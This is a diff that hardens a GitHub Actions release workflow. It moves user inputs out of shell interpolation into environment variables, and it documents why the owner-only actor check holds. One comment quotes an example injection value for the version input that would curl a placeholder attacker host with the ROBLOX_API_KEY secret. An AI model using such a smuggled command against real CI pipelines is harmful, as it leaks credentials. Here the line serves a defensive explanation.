@@ -40,6 +40,14 @@ jobs:
     runs-on: ubuntu-latest
     environment: release
     steps:
+      # THE ACTOR CHECK IS RIGHT FOR THIS REPOSITORY AND WOULD BE WRONG FOR AN
+      # ORGANIZATION. `github.repository_owner` is the org name when a repository
+      # is org-owned, and no human's login equals it, so this step would refuse
+      # every actor including a legitimate maintainer. Facet's repository is
+      # user-owned (`josha/Facet`), where the owner's login IS the actor's login.
+      # If it ever moves to an org, replace this with an explicit allowlist or a
+      # team-membership check — do not simply delete it, because the protected
+      # `release` environment governs WHERE a job may run, not WHO started it.
       - name: Refuse forks and non-owner actors
         env:
           IS_FORK: ${{ github.event.repository.fork }}
@@ -75,15 +83,23 @@ jobs:
           stylua --version
           python3 --version
 
+      # EVERY INPUT ARRIVES AS AN ENVIRONMENT VARIABLE, never as `${{ }}` inside
+      # the script. GitHub substitutes those expressions into the shell source
+      # BEFORE bash sees it, so a `version` of `x"; curl evil.example -d "$ROBLOX_API_KEY
+      # ` would have run as a command in the one step that holds the key. Quoted
+      # `"$VERSION"` is data no matter what it contains.
       - name: Release
         env:
           ROBLOX_API_KEY: ${{ secrets.ROBLOX_API_KEY }}
-        run: tools/release.sh "${{ inputs.version }}" "${{ inputs.commit }}"
+          VERSION: ${{ inputs.version }}
+          COMMIT: ${{ inputs.commit }}
+        run: tools/release.sh "$VERSION" "$COMMIT"
 
       - name: Upload the receipt
         if: always()
         uses: actions/upload-artifact@v4
         with:
+          # an artifact NAME is not shell, so interpolation here is safe
           name: facet-package-receipt-${{ inputs.version }}
           path: package/receipts/*.json
           if-no-files-found: warn
